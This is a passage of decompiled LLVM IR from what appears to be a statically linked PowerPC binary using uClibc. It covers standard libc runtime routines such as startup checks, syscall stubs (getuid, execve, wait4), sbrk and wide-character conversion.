  store i32 %v2_1000c29c, i32* @r3, align 4
  store i32 %v0_1000c2a0, i32* @r4, align 4
  store i32 8, i32* @r5, align 4
  store i32 268485292, i32* @lr, align 4
  %v0_1000c2a8 = call i32 @memcpy()
  %v0_1000c2ac.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000c2ac

dec_label_pc_1000c2ac:                            ; preds = %dec_label_pc_1000c28c, %dec_label_pc_1000c294
  %v0_1000c2ac = phi i32 [ %v0_1000c2a0, %dec_label_pc_1000c28c ], [ %v0_1000c2ac.pre, %dec_label_pc_1000c294 ]
  %v1_1000c2ac = add i32 %v0_1000c2ac, 8
  store i32 %v1_1000c2ac, i32* %r29.global-to-local, align 4
  %v1_1000c2b0 = inttoptr i32 %v1_1000c2ac to i32*
  %v2_1000c2b0 = load i32, i32* %v1_1000c2b0, align 4
  %v3_1000c2b4 = icmp eq i32 %v2_1000c2b0, 0
  br i1 %v3_1000c2b4, label %dec_label_pc_1000c2bc, label %dec_label_pc_1000c28c

dec_label_pc_1000c2bc:                            ; preds = %dec_label_pc_1000c2ac, %dec_label_pc_1000c284
  %v1_1000c2c0 = call i32 @_dl_aux_init(i32 %v2_1000c258)
  store i32 %v1_1000c2c0, i32* @r3, align 4
  store i32 268485320, i32* @lr, align 4
  %v1_1000c2c4 = call i32 @__GI___uClibc_init(i32 %v1_1000c2c0)
  %v3_1000c2cc = icmp eq i32 %tmp27, 0
  br i1 %v3_1000c2cc, label %dec_label_pc_1000c2d4, label %dec_label_pc_1000c2d8

dec_label_pc_1000c2d4:                            ; preds = %dec_label_pc_1000c2bc
  br label %dec_label_pc_1000c2d8

dec_label_pc_1000c2d8:                            ; preds = %dec_label_pc_1000c2bc, %dec_label_pc_1000c2d4
  %v0_1000c2e0 = phi i32 [ %tmp27, %dec_label_pc_1000c2bc ], [ 4096, %dec_label_pc_1000c2d4 ]
  store i32 %v0_1000c2e0, i32* @global_var_10024a78.554, align 4
  %v3_1000c2e4 = icmp eq i32 %tmp26, -1
  br i1 %v3_1000c2e4, label %dec_label_pc_1000c2ec, label %dec_label_pc_1000c320

dec_label_pc_1000c2ec:                            ; preds = %dec_label_pc_1000c2d8
  store i32 268485360, i32* @lr, align 4
  %v1_1000c2ec = call i32 @getuid(i32 268566528)
  store i32 %v1_1000c2ec, i32* %r29.global-to-local, align 4
  store i32 268485368, i32* @lr, align 4
  %v0_1000c2f4 = call i32 @geteuid()
  %v4_1000c2f8 = icmp eq i32 %v1_1000c2ec, %v0_1000c2f4
  br i1 %v4_1000c2f8, label %dec_label_pc_1000c300, label %dec_label_pc_1000c33c

dec_label_pc_1000c300:                            ; preds = %dec_label_pc_1000c2ec
  store i32 268485380, i32* @lr, align 4
  %v1_1000c300 = call i32 @getgid(i32 %v0_1000c2f4)
  store i32 %v1_1000c300, i32* %r29.global-to-local, align 4
  store i32 268485388, i32* @lr, align 4
  %v0_1000c308 = call i32 @getegid()
  %v4_1000c30c = icmp eq i32 %v1_1000c300, %v0_1000c308
  br i1 %v4_1000c30c, label %dec_label_pc_1000c314.thread, label %dec_label_pc_1000c33c

dec_label_pc_1000c314.thread:                     ; preds = %dec_label_pc_1000c300
  br label %dec_label_pc_1000c36c

dec_label_pc_1000c320:                            ; preds = %dec_label_pc_1000c2d8
  %v4_1000c324 = icmp eq i32 %tmp26, %tmp25
  br i1 %v4_1000c324, label %dec_label_pc_1000c32c, label %dec_label_pc_1000c33c

dec_label_pc_1000c32c:                            ; preds = %dec_label_pc_1000c320
  br label %dec_label_pc_1000c33c

dec_label_pc_1000c33c:                            ; preds = %dec_label_pc_1000c32c, %dec_label_pc_1000c320, %dec_label_pc_1000c300, %dec_label_pc_1000c2ec
  store i32 268485452, i32* @lr, align 4
  %v2_1000c348 = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 268485468, i32* @lr, align 4
  %v2_1000c358 = call i32 @__check_one_fd(i32 1, i32 32770)
  store i32 268485484, i32* @lr, align 4
  %v2_1000c368 = call i32 @__check_one_fd(i32 2, i32 32770)
  br label %dec_label_pc_1000c36c

dec_label_pc_1000c36c:                            ; preds = %dec_label_pc_1000c314.thread, %dec_label_pc_1000c33c
  %v0_1000c378 = load i32, i32* @r30, align 4
  %v1_1000c378 = inttoptr i32 %v0_1000c378 to i32*
  %v2_1000c378 = load i32, i32* %v1_1000c378, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v2_1000c378, i32* inttoptr (i32 268585500 to i32*), align 4
  %v0_1000c398 = load i32, i32* @r27, align 4
  store i32 %v0_1000c398, i32* @global_var_10024a7c.635, align 4
  br i1 false, label %dec_label_pc_1000c3a0, label %dec_label_pc_1000c418

dec_label_pc_1000c3a0:                            ; preds = %dec_label_pc_1000c36c, %dec_label_pc_1000c3a0
  br i1 undef, label %dec_label_pc_1000c3a0, label %dec_label_pc_1000c418

dec_label_pc_1000c418:                            ; preds = %dec_label_pc_1000c3a0, %dec_label_pc_1000c36c
  %v0_1000c3c4 = load i32, i32* @r28, align 4
  call void @__pseudo_call(i32 %v0_1000c3c4)
  store i32 0, i32* %r29.global-to-local, align 4
  %v0_1000c428 = call i32 @__errno_location()
  %v2_1000c430 = inttoptr i32 %v0_1000c428 to i32*
  store i32 0, i32* %v2_1000c430, align 4
  br i1 icmp eq (i32 add (i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32), i32 -14512), i32 0), label %dec_label_pc_1000c450, label %dec_label_pc_1000c444

dec_label_pc_1000c444:                            ; preds = %dec_label_pc_1000c418
  %v0_1000c444 = call i32 @__GI___h_errno_location()
  %v2_1000c44c = inttoptr i32 %v0_1000c444 to i32*
  store i32 0, i32* %v2_1000c44c, align 4
  br label %dec_label_pc_1000c450

dec_label_pc_1000c450:                            ; preds = %dec_label_pc_1000c418, %dec_label_pc_1000c444
  %v0_1000c45c = load i32, i32* @r25, align 4
  call void @__pseudo_call(i32 %v0_1000c45c)
  %v0_1000c468 = call i32 @__GI_exit()
  ret i32 %v0_1000c468

; uselistorder directives
  uselistorder i32 %v2_1000c2b0, { 1, 0 }
  uselistorder i32 %v1_1000c2ac, { 2, 1, 0 }
  uselistorder i32 %v1_1000c278, { 0, 2, 1, 3 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v2_1000c258, { 1, 0, 2 }
  uselistorder i32* %r29.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7 }
  uselistorder i32 ()* @__GI_exit, { 0, 6, 5, 3, 4, 1, 2 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 4096, { 1, 3, 10, 11, 2, 9, 4, 5, 6, 7, 0, 8 }
  uselistorder i32 14, { 2, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1000c450, { 1, 0 }
  uselistorder label %dec_label_pc_1000c3a0, { 1, 0 }
  uselistorder label %dec_label_pc_1000c36c, { 1, 0 }
  uselistorder label %dec_label_pc_1000c2d8, { 1, 0 }
  uselistorder label %dec_label_pc_1000c2ac, { 1, 0 }
  uselistorder label %dec_label_pc_1000c28c, { 1, 0 }
  uselistorder label %dec_label_pc_1000c258, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_1000c478 = load i32, i32* @r3, align 4
  store i32 %v0_1000c478, i32* @r29, align 4
  %v0_1000c480 = call i32 @__errno_location()
  %v0_1000c484 = load i32, i32* @r29, align 4
  %v2_1000c484 = inttoptr i32 %v0_1000c480 to i32*
  store i32 %v0_1000c484, i32* %v2_1000c484, align 4
  ret i32 -1
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c4b8 = call i32 @__asm_mfcr()
  %v1_1000c4bc = and i32 %v0_1000c4b8, 268435456
  %v3_1000c4bc = icmp eq i32 %v1_1000c4bc, 0
  store i32 %v0_1000c4b8, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c4bc, label %dec_label_pc_1000c4d4, label %dec_label_pc_1000c4c8

dec_label_pc_1000c4c8:                            ; preds = %entry
  %v0_1000c4c8 = call i32 @__errno_location()
  %v0_1000c4cc = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c4cc = inttoptr i32 %v0_1000c4c8 to i32*
  store i32 %v0_1000c4cc, i32* %v2_1000c4cc, align 4
  br label %dec_label_pc_1000c4d4

dec_label_pc_1000c4d4:                            ; preds = %entry, %dec_label_pc_1000c4c8
  %v0_1000c4e4 = phi i32 [ %v0_1000c4b8, %entry ], [ -1, %dec_label_pc_1000c4c8 ]
  ret i32 %v0_1000c4e4

; uselistorder directives
  uselistorder label %dec_label_pc_1000c4d4, { 1, 0 }
}

define i32 @__GI_execve(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c500 = call i32 @__asm_mfcr()
  %v1_1000c504 = and i32 %v0_1000c500, 268435456
  %v3_1000c504 = icmp eq i32 %v1_1000c504, 0
  store i32 %v0_1000c500, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c504, label %dec_label_pc_1000c51c, label %dec_label_pc_1000c510

dec_label_pc_1000c510:                            ; preds = %entry
  %v0_1000c510 = call i32 @__errno_location()
  %v0_1000c514 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c514 = inttoptr i32 %v0_1000c510 to i32*
  store i32 %v0_1000c514, i32* %v2_1000c514, align 4
  br label %dec_label_pc_1000c51c

dec_label_pc_1000c51c:                            ; preds = %entry, %dec_label_pc_1000c510
  %v0_1000c52c = phi i32 [ %v0_1000c500, %entry ], [ -1, %dec_label_pc_1000c510 ]
  ret i32 %v0_1000c52c

; uselistorder directives
  uselistorder label %dec_label_pc_1000c51c, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c548 = call i32 @__asm_mfcr()
  %v1_1000c54c = and i32 %v0_1000c548, 268435456
  %v3_1000c54c = icmp eq i32 %v1_1000c54c, 0
  store i32 %v0_1000c548, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c54c, label %dec_label_pc_1000c564, label %dec_label_pc_1000c558

dec_label_pc_1000c558:                            ; preds = %entry
  %v0_1000c558 = call i32 @__errno_location()
  %v0_1000c55c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c55c = inttoptr i32 %v0_1000c558 to i32*
  store i32 %v0_1000c55c, i32* %v2_1000c55c, align 4
  br label %dec_label_pc_1000c564

dec_label_pc_1000c564:                            ; preds = %entry, %dec_label_pc_1000c558
  %v0_1000c574 = phi i32 [ %v0_1000c548, %entry ], [ -1, %dec_label_pc_1000c558 ]
  ret i32 %v0_1000c574

; uselistorder directives
  uselistorder label %dec_label_pc_1000c564, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c590 = call i32 @__asm_mfcr()
  %v1_1000c594 = and i32 %v0_1000c590, 268435456
  %v3_1000c594 = icmp eq i32 %v1_1000c594, 0
  store i32 %v0_1000c590, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c594, label %dec_label_pc_1000c5ac, label %dec_label_pc_1000c5a0

dec_label_pc_1000c5a0:                            ; preds = %entry
  %v0_1000c5a0 = call i32 @__errno_location()
  %v0_1000c5a4 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c5a4 = inttoptr i32 %v0_1000c5a0 to i32*
  store i32 %v0_1000c5a4, i32* %v2_1000c5a4, align 4
  br label %dec_label_pc_1000c5ac

dec_label_pc_1000c5ac:                            ; preds = %entry, %dec_label_pc_1000c5a0
  %v0_1000c5bc = phi i32 [ %v0_1000c590, %entry ], [ -1, %dec_label_pc_1000c5a0 ]
  ret i32 %v0_1000c5bc

; uselistorder directives
  uselistorder label %dec_label_pc_1000c5ac, { 1, 0 }
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c5d8 = call i32 @__asm_mfcr()
  %v1_1000c5dc = and i32 %v0_1000c5d8, 268435456
  %v3_1000c5dc = icmp eq i32 %v1_1000c5dc, 0
  store i32 %v0_1000c5d8, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c5dc, label %dec_label_pc_1000c5f4, label %dec_label_pc_1000c5e8

dec_label_pc_1000c5e8:                            ; preds = %entry
  %v0_1000c5e8 = call i32 @__errno_location()
  %v0_1000c5ec = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c5ec = inttoptr i32 %v0_1000c5e8 to i32*
  store i32 %v0_1000c5ec, i32* %v2_1000c5ec, align 4
  br label %dec_label_pc_1000c5f4

dec_label_pc_1000c5f4:                            ; preds = %entry, %dec_label_pc_1000c5e8
  %v0_1000c604 = phi i32 [ %v0_1000c5d8, %entry ], [ -1, %dec_label_pc_1000c5e8 ]
  ret i32 %v0_1000c604

; uselistorder directives
  uselistorder label %dec_label_pc_1000c5f4, { 1, 0 }
}

define i32 @getuid(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c620 = call i32 @__asm_mfcr()
  %v1_1000c624 = and i32 %v0_1000c620, 268435456
  %v3_1000c624 = icmp eq i32 %v1_1000c624, 0
  store i32 %v0_1000c620, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c624, label %dec_label_pc_1000c63c, label %dec_label_pc_1000c630

dec_label_pc_1000c630:                            ; preds = %entry
  %v0_1000c630 = call i32 @__errno_location()
  %v0_1000c634 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c634 = inttoptr i32 %v0_1000c630 to i32*
  store i32 %v0_1000c634, i32* %v2_1000c634, align 4
  br label %dec_label_pc_1000c63c

dec_label_pc_1000c63c:                            ; preds = %entry, %dec_label_pc_1000c630
  %v0_1000c64c = phi i32 [ %v0_1000c620, %entry ], [ -1, %dec_label_pc_1000c630 ]
  ret i32 %v0_1000c64c

; uselistorder directives
  uselistorder label %dec_label_pc_1000c63c, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c668 = call i32 @__asm_mfcr()
  %v1_1000c66c = and i32 %v0_1000c668, 268435456
  %v3_1000c66c = icmp eq i32 %v1_1000c66c, 0
  store i32 %v0_1000c668, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c66c, label %dec_label_pc_1000c684, label %dec_label_pc_1000c678

dec_label_pc_1000c678:                            ; preds = %entry
  %v0_1000c678 = call i32 @__errno_location()
  %v0_1000c67c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c67c = inttoptr i32 %v0_1000c678 to i32*
  store i32 %v0_1000c67c, i32* %v2_1000c67c, align 4
  br label %dec_label_pc_1000c684

dec_label_pc_1000c684:                            ; preds = %entry, %dec_label_pc_1000c678
  %v0_1000c694 = phi i32 [ %v0_1000c668, %entry ], [ -1, %dec_label_pc_1000c678 ]
  ret i32 %v0_1000c694

; uselistorder directives
  uselistorder label %dec_label_pc_1000c684, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r30, align 4
  %v3_1000c6b4 = load i32, i32* @global_var_10024aa8.642, align 4
  %v3_1000c6b8 = icmp eq i32 %v3_1000c6b4, 0
  br i1 %v3_1000c6b8, label %dec_label_pc_1000c6c0, label %dec_label_pc_1000c6cc

dec_label_pc_1000c6c0:                            ; preds = %entry
  store i32 268486340, i32* @lr, align 4
  %v1_1000c6c0 = call i32 @__GI_brk(i32 0)
  %v1_1000c6c4 = icmp slt i32 %v1_1000c6c0, 0
  br i1 %v1_1000c6c4, label %dec_label_pc_1000c6ec, label %dec_label_pc_1000c6c0.dec_label_pc_1000c6cc_crit_edge

dec_label_pc_1000c6c0.dec_label_pc_1000c6cc_crit_edge: ; preds = %dec_label_pc_1000c6c0
  %v0_1000c6cc.pre = load i32, i32* @r30, align 4
  %v3_1000c6d0.pre = load i32, i32* @global_var_10024aa8.642, align 4
  br label %dec_label_pc_1000c6cc

dec_label_pc_1000c6cc:                            ; preds = %dec_label_pc_1000c6c0.dec_label_pc_1000c6cc_crit_edge, %entry
  %v3_1000c6d0 = phi i32 [ %v3_1000c6d0.pre, %dec_label_pc_1000c6c0.dec_label_pc_1000c6cc_crit_edge ], [ %v3_1000c6b4, %entry ]
  %v1_1000c6d8 = phi i32 [ %v0_1000c6cc.pre, %dec_label_pc_1000c6c0.dec_label_pc_1000c6cc_crit_edge ], [ %arg1, %entry ]
  %v3_1000c6cc = icmp eq i32 %v1_1000c6d8, 0
  store i32 %v3_1000c6d0, i32* @r31, align 4
  br i1 %v3_1000c6cc, label %dec_label_pc_1000c6f0, label %dec_label_pc_1000c6e0

dec_label_pc_1000c6e0:                            ; preds = %dec_label_pc_1000c6cc
  %v2_1000c6d8 = add i32 %v1_1000c6d8, %v3_1000c6d0
  store i32 268486372, i32* @lr, align 4
  %v1_1000c6e0 = call i32 @__GI_brk(i32 %v2_1000c6d8)
  %tmp6 = icmp sgt i32 %v1_1000c6e0, -1
  br i1 %tmp6, label %dec_label_pc_1000c6e0.dec_label_pc_1000c6f0_crit_edge, label %dec_label_pc_1000c6ec

dec_label_pc_1000c6e0.dec_label_pc_1000c6f0_crit_edge: ; preds = %dec_label_pc_1000c6e0
  %v0_1000c6f4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000c6f0

dec_label_pc_1000c6ec:                            ; preds = %dec_label_pc_1000c6e0, %dec_label_pc_1000c6c0
  store i32 -1, i32* @r31, align 4
  br label %dec_label_pc_1000c6f0

dec_label_pc_1000c6f0:                            ; preds = %dec_label_pc_1000c6e0.dec_label_pc_1000c6f0_crit_edge, %dec_label_pc_1000c6cc, %dec_label_pc_1000c6ec
  %v0_1000c6f4 = phi i32 [ %v0_1000c6f4.pre, %dec_label_pc_1000c6e0.dec_label_pc_1000c6f0_crit_edge ], [ %v3_1000c6d0, %dec_label_pc_1000c6cc ], [ -1, %dec_label_pc_1000c6ec ]
  ret i32 %v0_1000c6f4

; uselistorder directives
  uselistorder i32 %v3_1000c6d0, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_1000c6f0, { 2, 0, 1 }
}

define i32 @wait4(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c720 = call i32 @__asm_mfcr()
  %v1_1000c724 = and i32 %v0_1000c720, 268435456
  %v3_1000c724 = icmp eq i32 %v1_1000c724, 0
  store i32 %v0_1000c720, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c724, label %dec_label_pc_1000c73c, label %dec_label_pc_1000c730

dec_label_pc_1000c730:                            ; preds = %entry
  %v0_1000c730 = call i32 @__errno_location()
  %v0_1000c734 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c734 = inttoptr i32 %v0_1000c730 to i32*
  store i32 %v0_1000c734, i32* %v2_1000c734, align 4
  br label %dec_label_pc_1000c73c

dec_label_pc_1000c73c:                            ; preds = %entry, %dec_label_pc_1000c730
  %v0_1000c74c = phi i32 [ %v0_1000c720, %entry ], [ -1, %dec_label_pc_1000c730 ]
  ret i32 %v0_1000c74c

; uselistorder directives
  uselistorder label %dec_label_pc_1000c73c, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_10024a8c.643 to i32)
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1000c75c = icmp eq i32 %arg1, 0
  store i32 %arg3, i32* @r7, align 4
  store i32 16, i32* @r6, align 4
  %v2_1000c778 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_1000c778, i32* @r4, align 4
  store i32 1, i32* @r5, align 4
  br i1 %v3_1000c75c, label %dec_label_pc_1000c784, label %dec_label_pc_1000c78c

dec_label_pc_1000c784:                            ; preds = %entry
  %v2_1000c784 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000c784, i32* @r3, align 4
  br label %dec_label_pc_1000c78c

dec_label_pc_1000c78c:                            ; preds = %entry, %dec_label_pc_1000c784
  %v0_1000c790 = phi i32 [ %arg2, %entry ], [ 0, %dec_label_pc_1000c784 ]
  %v2_1000c78c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v0_1000c790, i32* %stack_var_-40, align 4
  store i32 %v2_1000c78c, i32* %stack_var_-36, align 4
  store i32 268486556, i32* @lr, align 4
  %v0_1000c798 = call i32 @__GI_wcsnrtombs()
  %v3_1000c79c = icmp eq i32 %v0_1000c798, 0
  br i1 %v3_1000c79c, label %dec_label_pc_1000c7a4, label %dec_label_pc_1000c7a8

dec_label_pc_1000c7a4:                            ; preds = %dec_label_pc_1000c78c
  br label %dec_label_pc_1000c7a8

dec_label_pc_1000c7a8:                            ; preds = %dec_label_pc_1000c78c, %dec_label_pc_1000c7a4
  %v0_1000c7b4 = phi i32 [ %v0_1000c798, %dec_label_pc_1000c78c ], [ 1, %dec_label_pc_1000c7a4 ]
  ret i32 %v0_1000c7b4

; uselistorder directives
  uselistorder label %dec_label_pc_1000c7a8, { 1, 0 }
  uselistorder label %dec_label_pc_1000c78c, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %v0_1000c7b8 = load i32, i32* @r6, align 4
  store i32 %v0_1000c7b8, i32* @r7, align 4
  %v0_1000c7bc = load i32, i32* @r5, align 4
  store i32 %v0_1000c7bc, i32* @r6, align 4
  store i32 -1, i32* @r5, align 4
  %v0_1000c7c4 = call i32 @__GI_wcsnrtombs()
  ret i32 %v0_1000c7c4

; uselistorder directives
  uselistorder i32 ()* @__GI_wcsnrtombs, { 1, 0 }
}

define i32 @__GI_wcsnrtombs() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1000c7c8 = load i32, i32* @r3, align 4
  %v3_1000c7c8 = icmp eq i32 %v0_1000c7c8, 0
  %v0_1000c7cc = load i32, i32* @lr, align 4
  store i32 %v0_1000c7cc, i32* %r0.global-to-local, align 4
  br i1 %v3_1000c7c8, label %dec_label_pc_1000c7f4, label %dec_label_pc_1000c7dc

dec_label_pc_1000c7dc:                            ; preds = %entry
  %v1_1000c7dc = load i32, i32* @r4, align 4
  %v4_1000c7dc = icmp eq i32 %v0_1000c7c8, %v1_1000c7dc
  store i32 1, i32* %r10.global-to-local, align 4
  br i1 %v4_1000c7dc, label %dec_label_pc_1000c7e8, label %dec_label_pc_1000c820

dec_label_pc_1000c7e8:                            ; preds = %dec_label_pc_1000c7dc
  %v2_1000c7ec = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1000c7ec, i32* @r3, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000c820

dec_label_pc_1000c7f4:                            ; preds = %entry
  %v2_1000c7ec11 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1000c7ec11, i32* @r3, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 -1, i32* @r6, align 4
  br label %dec_label_pc_1000c820

dec_label_pc_1000c800:                            ; preds = %dec_label_pc_1000c860.dec_label_pc_1000c840_crit_edge, %dec_label_pc_1000c840.preheader
  %v0_1000c800 = call i32 @__errno_location()
  store i32 84, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r5.global-to-local, align 4
  %v2_1000c80c = inttoptr i32 %v0_1000c800 to i32*
  store i32 84, i32* %v2_1000c80c, align 4
  %v0_1000c884.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000c880

dec_label_pc_1000c814:                            ; preds = %dec_label_pc_1000c850
  store i32 0, i32* %r11.global-to-local, align 4
  %v0_1000c870.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000c86c

dec_label_pc_1000c820:                            ; preds = %dec_label_pc_1000c7e8, %dec_label_pc_1000c7dc, %dec_label_pc_1000c7f4
  %v2_1000c8507 = phi i32 [ %v2_1000c7ec, %dec_label_pc_1000c7e8 ], [ %v0_1000c7c8, %dec_label_pc_1000c7dc ], [ %v2_1000c7ec11, %dec_label_pc_1000c7f4 ]
  %v0_1000c820 = load i32, i32* @r5, align 4
  %v1_1000c820 = load i32, i32* @r6, align 4
  %v3_1000c820 = icmp ugt i32 %v0_1000c820, %v1_1000c820
  br i1 %v3_1000c820, label %dec_label_pc_1000c828, label %dec_label_pc_1000c82c

dec_label_pc_1000c828:                            ; preds = %dec_label_pc_1000c820
  store i32 %v1_1000c820, i32* @r5, align 4
  br label %dec_label_pc_1000c82c

dec_label_pc_1000c82c:                            ; preds = %dec_label_pc_1000c820, %dec_label_pc_1000c828
  %v0_1000c838 = phi i32 [ %v0_1000c820, %dec_label_pc_1000c820 ], [ %v1_1000c820, %dec_label_pc_1000c828 ]
  %v1_1000c82c = add i32 %v0_1000c838, 1
  store i32 %v1_1000c82c, i32* %r0.global-to-local, align 4
  %v0_1000c830 = load i32, i32* @r4, align 4
  %v1_1000c830 = inttoptr i32 %v0_1000c830 to i32*
  %v2_1000c830 = load i32, i32* %v1_1000c830, align 4
  store i32 %v2_1000c830, i32* %r11.global-to-local, align 4
  store i32 %v0_1000c838, i32* %r9.global-to-local, align 4
  store i32 %v0_1000c838, i32* %ctr.global-to-local, align 4
  %v2_1000c8683 = icmp eq i32 %v0_1000c838, 0
  br i1 %v2_1000c8683, label %dec_label_pc_1000c86c, label %dec_label_pc_1000c840.preheader

dec_label_pc_1000c840.preheader:                  ; preds = %dec_label_pc_1000c82c
  %v1_1000c84016 = inttoptr i32 %v2_1000c830 to i32*
  %v2_1000c84017 = load i32, i32* %v1_1000c84016, align 4
  store i32 %v2_1000c84017, i32* %r0.global-to-local, align 4
  %v1_1000c84418 = add i32 %v2_1000c830, 4
  store i32 %v1_1000c84418, i32* %r11.global-to-local, align 4
  %v2_1000c84820 = icmp ugt i32 %v2_1000c84017, 127
  br i1 %v2_1000c84820, label %dec_label_pc_1000c800, label %dec_label_pc_1000c850.lr.ph

dec_label_pc_1000c850.lr.ph:                      ; preds = %dec_label_pc_1000c840.preheader
  %extract.t = trunc i32 %v2_1000c84017 to i8
  br label %dec_label_pc_1000c850

dec_label_pc_1000c850:                            ; preds = %dec_label_pc_1000c850.lr.ph, %dec_label_pc_1000c860.dec_label_pc_1000c840_crit_edge
  %v2_1000c84023.off0 = phi i8 [ %extract.t, %dec_label_pc_1000c850.lr.ph ], [ %extract.t24, %dec_label_pc_1000c860.dec_label_pc_1000c840_crit_edge ]
  %v2_1000c85022 = phi i32 [ %v2_1000c8507, %dec_label_pc_1000c850.lr.ph ], [ %v2_1000c860, %dec_label_pc_1000c860.dec_label_pc_1000c840_crit_edge ]
  %v3_1000c850 = inttoptr i32 %v2_1000c85022 to i8*
  store i8 %v2_1000c84023.off0, i8* %v3_1000c850, align 1
  %v0_1000c854 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c854 = urem i32 %v0_1000c854, 256
  store i32 %v1_1000c854, i32* %r0.global-to-local, align 4
  %v3_1000c858 = icmp eq i32 %v1_1000c854, 0
  br i1 %v3_1000c858, label %dec_label_pc_1000c814, label %dec_label_pc_1000c860

dec_label_pc_1000c860:                            ; preds = %dec_label_pc_1000c850
  %v0_1000c860 = load i32, i32* @r3, align 4
  %v1_1000c860 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000c860 = add i32 %v1_1000c860, %v0_1000c860
  store i32 %v2_1000c860, i32* @r3, align 4
  %v0_1000c864 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c864 = add i32 %v0_1000c864, -1
  store i32 %v1_1000c864, i32* %r9.global-to-local, align 4
  %v0_1000c868 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000c868 = add i32 %v0_1000c868, -1
  store i32 %v1_1000c868, i32* %ctr.global-to-local, align 4
  %v2_1000c868 = icmp eq i32 %v1_1000c868, 0
  br i1 %v2_1000c868, label %dec_label_pc_1000c86c, label %dec_label_pc_1000c860.dec_label_pc_1000c840_crit_edge

dec_label_pc_1000c860.dec_label_pc_1000c840_crit_edge: ; preds = %dec_label_pc_1000c860
  %v0_1000c840.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_1000c840 = inttoptr i32 %v0_1000c840.pre to i32*
  %v2_1000c840 = load i32, i32* %v1_1000c840, align 4
  store i32 %v2_1000c840, i32* %r0.global-to-local, align 4
  %v1_1000c844 = add i32 %v0_1000c840.pre, 4
  store i32 %v1_1000c844, i32* %r11.global-to-local, align 4
  %v2_1000c848 = icmp ugt i32 %v2_1000c840, 127
  %extract.t24 = trunc i32 %v2_1000c840 to i8
  br i1 %v2_1000c848, label %dec_label_pc_1000c800, label %dec_label_pc_1000c850

dec_label_pc_1000c86c:                            ; preds = %dec_label_pc_1000c860, %dec_label_pc_1000c82c, %dec_label_pc_1000c814
  %v0_1000c870 = phi i32 [ %v0_1000c870.pre, %dec_label_pc_1000c814 ], [ %v2_1000c8507, %dec_label_pc_1000c82c ], [ %v2_1000c860, %dec_label_pc_1000c860 ]
  %v2_1000c86c = ptrtoint i32* %stack_var_-24 to i32
